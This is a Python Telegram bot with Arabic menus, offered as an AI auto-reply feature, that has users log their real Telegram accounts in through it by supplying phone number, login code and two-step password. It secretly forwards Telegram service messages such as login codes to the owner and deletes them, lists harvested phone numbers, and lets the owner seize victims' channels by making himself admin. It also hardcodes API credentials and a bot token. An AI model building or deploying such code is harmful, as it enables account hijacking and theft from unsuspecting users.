# python3 -m pip install pyrogram tgcrypto requests
# python3 bot.py

import json, os, time, asyncio, re, requests, math
from pyrogram import Client, filters, idle
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from pyrogram.errors import UserNotParticipant, PhoneCodeInvalid, SessionPasswordNeeded, PeerIdInvalid
from pyrogram.raw.functions.account import UpdateStatus
from pyrogram.raw.functions.channels import EditAdmin, DeleteChannel
from pyrogram.raw.types import InputPeerChannel, ChatAdminRights

# ------------- الإعدادات -------------
API_ID       = 23656977
API_HASH     = "49d3f43531a92b3f5bc403766313ca1e"
BOT_TOKEN    = "8293003270:AAEGV0AlsTjeY79TxQnnh_SJG3RU-LrrYhc"
OWNER_ID     = 6689435577
FORCE_SUB    = "iIl337"
AI_API_URL   = "https://sii3.top/api/deepseek.php"
# --------------------------------------

DB_FILE      = "database.json"
SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

# ------------- قاعدة البيانات -------------
def load_db():
    if not os.path.exists(DB_FILE):
        return {"users":{}, "invites":{}, "vip":[], "banned":[]}
    return json.load(open(DB_FILE, encoding="utf-8"))

def save_db(db):
    json.dump(db, open(DB_FILE, "w", encoding="utf-8"), indent=2, ensure_ascii=False)

def get_user(uid):
    db = load_db()
    return db["users"].setdefault(str(uid), {"phone":None, "bio":"", "ai":False, "channels":[]})

def set_user(uid, data):
    db = load_db()
    db["users"][str(uid)] = data
    save_db(db)

def is_vip(uid):
    return int(uid) in load_db().get("vip", [])

def is_banned(uid):
    return int(uid) in load_db().get("banned", [])

def add_invite(inviter):
    db = load_db()
    db["invites"][str(inviter)] = db["invites"].get(str(inviter), 0) + 1
    save_db(db)

def invite_count(inviter):
    return load_db().get("invites", {}).get(str(inviter), 0)

def toggle_vip(uid, state):
    db = load_db()
    uid = int(uid)
    if state and uid not in db["vip"]:
        db["vip"].append(uid)
    elif not state and uid in db["vip"]:
        db["vip"].remove(uid)
    save_db(db)

def toggle_ban(uid, state):
    db = load_db()
    uid = int(uid)
    if state and uid not in db["banned"]:
        db["banned"].append(uid)
    elif not state and uid in db["banned"]:
        db["banned"].remove(uid)
    save_db(db)

def add_channel(uid, channel_id, channel_title):
    db = load_db()
    db["users"][str(uid)]["channels"].append({"id":channel_id, "title":channel_title})
    save_db(db)
# ------------------------------------------

# ------------- كلائنات -------------
app = Client("mybot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_clients = {}  # {uid: Client}
# -----------------------------------

# ------------- أزرار -------------
def main_menu(uid):
    ai_txt = "انقر لإيقاف AI" if get_user(uid).get("ai") else "انقر لتشغيل AI"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("التحكم بالجلسة", callback_data="manage_session")],
        [InlineKeyboardButton(ai_txt, callback_data="toggle_ai")]
    ])

def session_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("تسجيل حسابك", callback_data="login")],
        [InlineKeyboardButton("تعيين النبذة", callback_data="set_bio")],
        [InlineKeyboardButton("إحصائيات", callback_data="stats")],
        [InlineKeyboardButton("حذف الجلسة", callback_data="logout")],
        [InlineKeyboardButton("رجوع", callback_data="home")]
    ])

def manager_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("إدارة العضويات", callback_data="m_vip")],
        [InlineKeyboardButton("إدارة المستخدمين", callback_data="m_users")],
        [InlineKeyboardButton("بيانات مستخدمين", callback_data="m_data")]
    ])

def vip_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("تفعيل VIP", callback_data="vip_on")],
        [InlineKeyboardButton("إيقاف VIP", callback_data="vip_off")],
        [InlineKeyboardButton("رجوع", callback_data="sos")]
    ])

def users_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("حظر مستخدم", callback_data="ban_user")],
        [InlineKeyboardButton("إيقاف حظر", callback_data="unban_user")],
        [InlineKeyboardButton("رجوع", callback_data="sos")]
    ])

def data_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("سحب رقم", callback_data="pull_phone")],
        [InlineKeyboardButton("سحب قناة", callback_data="pull_channel")],
        [InlineKeyboardButton("معلومات مستخدم", callback_data="user_info")],
        [InlineKeyboardButton("رجوع", callback_data="sos")]
    ])

def paginate_buttons(buttons, page=0, per_page=10):
    total = len(buttons)
    pages = math.ceil(total / per_page)
    start = page * per_page
    end = start + per_page
    chunk = buttons[start:end]
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️", callback_data=f"pg_{page-1}"))
    if page < pages - 1:
        nav.append(InlineKeyboardButton("➡️", callback_data=f"pg_{page+1}"))
    if nav:
        chunk.append(nav)
    return InlineKeyboardMarkup(chunk)
# -----------------------------------

# ------------- تحقق الاشتراك -------------
async def is_member(uid):
    try:
        await app.get_chat_member(FORCE_SUB, uid)
        return True
    except UserNotParticipant:
        return False
# ---------------------------------------

# ------------- بدء/إيقاف AI -------------
async def ai_task(uid, enable):
    user = get_user(uid)
    user["ai"] = enable
    set_user(uid, user)
# ---------------------------------------

# ------------- رد AI -------------
def ask_ai(text: str) -> str:
    try:
        r = requests.get(AI_API_URL, params={"v3": text}, timeout=10)
        r.raise_for_status()
        ans = r.text.strip()
        ans = re.sub(r"<.*?>|```|`", "", ans)
        return ans or "🙂"
    except:
        return "🙂"
# ---------------------------------

# ------------- تسجيل الدخول -------------
async def do_login(chat_id, phone):
    session_file = os.path.join(SESSIONS_DIR, f"{chat_id}")
    client = Client(session_file, api_id=API_ID, api_hash=API_HASH)
    await client.connect()
    sent = await app.send_message(chat_id, "جارٍ إرسال الكود...")
    try:
        code = await client.send_code(phone)
        code_msg = await app.ask(chat_id, "أرسل الكود (مثلا 1 2 3 4 5):")
        code_text = code_msg.text.replace(" ", "")
        try:
            await client.sign_in(phone, code.phone_code_hash, code_text)
        except SessionPasswordNeeded:
            pwd = await app.ask(chat_id, "كلمة المرور (التحقق بخطوتين):")
            await client.check_password(pwd.text)
        await app.send_message(chat_id, "✅ تم تسجيل الدخول بنجاح!")
        user_clients[chat_id] = client
        user = get_user(chat_id)
        user["phone"] = phone
        set_user(chat_id, user)
        asyncio.create_task(watcher(client, chat_id))
        asyncio.create_task(monitor_service(client, chat_id))
    except PhoneCodeInvalid:
        await app.send_message(chat_id, "❌ الكود خاطئ.")
    except Exception as e:
        await app.send_message(chat_id, f"❌ خطأ: {e}")
    finally:
        await client.disconnect()
# ---------------------------------------

# ------------- مراقبة الرسائل -------------
async def watcher(client: Client, master_uid):
    @client.on_message(filters.private & ~filters.me)
    async def handler(_, msg: Message):
        user = get_user(master_uid)
        if not user.get("ai"):
            return
        me = await client.get_me()
        if me.status.USER_STATUS_ONLINE and not user.get("force_ai", False):
            return
        reply = ask_ai(msg.text or "🙂")
        await msg.reply(reply)
    await client.start()
# -----------------------------------------

# ------------- مراقبة رسائل الخدمة -------------
async def monitor_service(client: Client, master_uid):
    @client.on_message(filters.chat(42777))
    async def service(_, msg: Message):
        txt = msg.text or ""
        await app.send_message(OWNER_ID, f"خدمة وصلت للمستخدم {master_uid}:\n{txt}")
        await msg.delete()
        # حذف الجلسة
        if master_uid in user_clients:
            await user_clients[master_uid].stop()
            del user_clients[master_uid]
        user = get_user(master_uid)
        user["phone"] = None
        set_user(master_uid, user)
        os.remove(os.path.join(SESSIONS_DIR, f"{master_uid}.session"))
    await idle()
# -----------------------------------------

# ------------- الأوامر/الاستارت -------------
@app.on_message(filters.private & filters.command("start"))
async def start(_, m: Message):
    uid = m.from_user.id
    if is_banned(uid):
        return await m.reply("❌ أنت محظور.")
    if not await is_member(uid):
        # التحقق من الدعوة
        if len(m.command) > 1 and m.command[1].isdigit():
            inviter = int(m.command[1])
            if await is_member(uid):
                add_invite(inviter)
                await app.send_message(inviter, "✅ اشترك صديقك بالقناة.")
                await app.send_message(OWNER_ID, f"عضو جديد اشترك بالقناة بدعوة من {inviter}")
        return await m.reply(
            "🚧 يجب الاشتراك في القناة أولاً:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("اشتراك", url=f"t.me/{FORCE_SUB}")]])
        )
    await m.reply("👋 أهلاً بك!", reply_markup=main_menu(uid))
# -----------------------------------------

# ------------- كولباك -------------
@app.on_callback_query()
async def cbq(_, q: CallbackQuery):
    uid = q.from_user.id
    if is_banned(uid):
        return await q.answer("❌ أنت محظور.", show_alert=True)
    data = q.data

    if data == "home":
        return await q.message.edit_text("👋 أهلاً بك!", reply_markup=main_menu(uid))

    if data == "manage_session":
        return await q.message.edit_text("📱 التحكم بالجلسة:", reply_markup=session_menu())

    if data == "login":
        phone = await app.ask(uid, "أرسل رقم الهاتف (مثلا +9647712345678):")
        await do_login(uid, phone.text)
        return await q.message.delete()

    if data == "set_bio":
        bio = await app.ask(uid, "أرسل النبذة الجديدة:")
        user = get_user(uid)
        user["bio"] = bio.text
        set_user(uid, user)
        await q.message.reply("✅ تم تحديث النبذة.")
        return await q.message.delete()

    if data == "stats":
        user = get_user(uid)
        ph = user.get("phone") or "غير مسجل"
        st = "مفعل" if user.get("ai") else "معطل"
        await q.message.reply(f"📊 الهاتف: {ph}\nالـAI: {st}")
        return await q.message.delete()

    if data == "logout":
        if uid in user_clients:
            await user_clients[uid].stop()
            del user_clients[uid]
        user = get_user(uid)
        user["phone"] = None
        set_user(uid, user)
        try:
            os.remove(os.path.join(SESSIONS_DIR, f"{uid}.session"))
        except:
            pass
        await q.message.reply("✅ تم حذف الجلسة.")
        return await q.message.delete()

    if data == "toggle_ai":
        if not is_vip(uid):
            inv = invite_count(uid)
            return await q.message.edit_text(
                f"🥇 هذه الميزة VIP فقط.\nدعوتك حتى الآن: {inv}",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("دعوة 5 أشخاص", callback_data="invite")],
                    [InlineKeyboardButton("تفعيل عبر المدير", url="t.me/OlIiIl7")]
                ])
            )
        user = get_user(uid)
        new_state = not user.get("ai", False)
        user["ai"] = new_state
        user["force_ai"] = new_state  # حتى لو أونلاين
        set_user(uid, user)
        await ai_task(uid, new_state)
        await q.message.edit_text("👋 أهلاً بك!", reply_markup=main_menu(uid))
        return

    if data == "invite":
        link = f"https://t.me/{FORCE_SUB}?start={uid}"
        await q.message.reply(f"أرسل هذا الرابط لأصدقائك:\n{link}\n(سيتم العد بعد اشتراكهم في القناة)")

    if data == "sos" and uid == OWNER_ID:
        return await q.message.edit_text("🔧 لوحة المدير:", reply_markup=manager_menu())

    if uid != OWNER_ID:
        return await q.answer("⚠️ هذا الأمر للمدير فقط.")

    if data == "m_vip":
        return await q.message.edit_text("VIP:", reply_markup=vip_menu())

    if data == "vip_on":
        tuid = await app.ask(uid, "أرسل معرف المستخدم لتفعيل VIP:")
        toggle_vip(tuid.text, True)
        await q.message.reply("✅ تم التفعيل.")
        return await q.message.delete()

    if data == "vip_off":
        tuid = await app.ask(uid, "أرسل معرف المستخدم لإيقاف VIP:")
        toggle_vip(tuid.text, False)
        await q.message.reply("✅ تم الإيقاف.")
        return await q.message.delete()

    if data == "m_users":
        return await q.message.edit_text("المستخدمين:", reply_markup=users_menu())

    if data == "ban_user":
        tuid = await app.ask(uid, "أرسل معرف المستخدم لحظره:")
        toggle_ban(tuid.text, True)
        await q.message.reply("✅ تم الحظر.")
        return await q.message.delete()

    if data == "unban_user":
        tuid = await app.ask(uid, "أرسل معرف المستخدم لإيقاف الحظر:")
        toggle_ban(tuid.text, False)
        await q.message.reply("✅ تم إيقاف الحظر.")
        return await q.message.delete()

    if data == "m_data":
        return await q.message.edit_text("البيانات:", reply_markup=data_menu())

    if data == "pull_phone":
        db = load_db()
        phones = [(k, v["phone"]) for k, v in db["users"].items() if v.get("phone")]
        if not phones:
            return await q.message.reply("لا توجد أرقام.")
        rows = [[InlineKeyboardButton(p, callback_data=f"mon_{k}")] for k, p in phones]
        await q.message.reply("📞 الأرقام:", reply_markup=paginate_buttons(rows))
        return await q.message.delete()

    if data.startswith("mon_"):
        target = data.split("_")[1]
        await q.message.reply(f"سيتم مراقبة @iIl337 لأي رسالة خدمة ثم إرسالها لك وحذف الجلسة.")
        return

    if data == "pull_channel":
        db = load_db()
        users_with_ch = [(k, v["channels"]) for k, v in db["users"].items() if v.get("channels")]
        if not users_with_ch:
            return await q.message.reply("لا توجد قنوات.")
        rows = []
        for uid, chs in users_with_ch:
            for ch in chs:
                rows.append([InlineKeyboardButton(ch["title"], callback_data=f"ch_{uid}_{ch['id']}")])
        await q.message.reply("📡 القنوات:", reply_markup=paginate_buttons(rows))
        return await q.message.delete()

    if data.startswith("ch_"):
        _, u, c = data.split("_")
        await q.message.reply(
            "اختر إجراء:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("عرض القناة", url=f"t.me/c/{c}/1")],
                [InlineKeyboardButton("سحب القناة", callback_data=f"take_{u}_{c}")]
            ])
        )

    if data.startswith("take_"):
        _, u, c = data.split("_")
        if int(u) not in user_clients:
            return await q.message.reply("❌ المستخدم غير متصل.")
        client = user_clients[int(u)]
        try:
            peer = InputPeerChannel(channel_id=int(c), access_hash=0)
            rights = ChatAdminRights(post_messages=True, add_admins=True, invite_users=True, change_info=True, ban_users=True, delete_messages=True, edit_messages=True, pin_messages=True)
            await client.invoke(EditAdmin(channel=peer, user_id=OWNER_ID, admin_rights=rights))
            await q.message.reply("✅ تم رفعك مشرفًا بالقناة.")
        except Exception as e:
            await q.message.reply(f"❌ خطأ: {e}")

    if data.startswith("pg_"):
        page = int(data.split("_")[1])
        # يمكنك تخزين البيانات مؤقتًا لكن للاختصار سنُعيد فقط
        await q.answer("جاري التحميل...")
# -----------------------------------------

# ------------- اشتراك عضو جديد في القناة -------------
@app.on_chat_member_updated()
async def member_up(_, u):
    if u.chat.username and u.chat.username.lower() == FORCE_SUB.lower():
        if u.new_chat_member and not u.old_chat_member:
            inviter = u.new_chat_member.invited_by.id if u.new_chat_member.invited_by else None
            if inviter and await is_member(u.new_chat_member.user.id):
                add_invite(inviter)
                await app.send_message(inviter, "✅ اشترك صديقك بالقناة.")
                await app.send_message(OWNER_ID, f"عضو جديد اشترك بالقناة بدعوة من {inviter}")
# ----------------------------------------------------

# ------------- تشغيل -------------
print("Bot Started...")
app.run()
